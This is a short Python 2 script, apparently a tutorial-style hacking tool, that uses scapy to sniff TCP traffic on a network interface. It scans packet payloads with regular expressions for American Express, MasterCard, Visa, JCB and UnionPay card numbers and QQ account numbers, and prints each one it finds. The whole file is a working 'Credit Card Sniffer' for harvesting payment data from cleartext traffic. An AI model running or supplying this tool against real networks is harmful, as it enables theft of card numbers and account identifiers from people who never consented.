import re
import optparse
from scapy.all import *
def findCreditCard(pkt):
    '''Refer to: http://www.regular-expressions.info/creditcard.html'''
    raw = pkt.sprintf('%Raw.load%')
    americanExpress = re.findall('3[47][0-9]{13}', raw)
    masterCard = re.findall('5[1-5]\d{14}', raw)
    visaCard = re.findall('4\d{12}(?:\d{3})?', raw)
    jcbCard = re.findall('(?:2131|1800|35\d{3})\d{11}', raw)
    unionPay = re.findall('6\d{15,18}', raw)
    qqNum = re.findall('[1-9]\d{5,9}', raw)
    if americanExpress:
        print '[+] Found American Express Card: ' + americanExpress[0]
    if masterCard:
        print '[+] Found Master Card: ' + masterCard[0]
    if visaCard:
        print '[+] Found Visa Card: ' + visaCard[0]
    if jcbCard:
        print '[+] Found JCB Card: ' + jcbCard[0]
    if unionPay:
        print '[+] Found Union Pay Card: ' + unionPay[0]
    if qqNum:
        print '[+] Found QQ Number: ' + qqNum[0]

def main():
    usage = "%prog -i<interface>"
    parser = optparse.OptionParser(usage, version="%prog 1.0")
    parser.add_option('-i', dest='interface', type='string',\
                    help='specify interface to listen on')
    (options, args) = parser.parse_args()

    if options.interface == None:
        print parser.print_help()
        #conf.iface = 'Realtek RTL8723BE Wireless LAN 802.11n PCI-E NIC'
        exit(0)
    else:
        conf.iface = options.interface
    try:
        print '[*] Starting Credit Card Sniffer.'
        sniff(filter='tcp', prn=findCreditCard, store=0)
    except KeyboardInterrupt:
        exit(0)

if __name__ == '__main__':
    main()
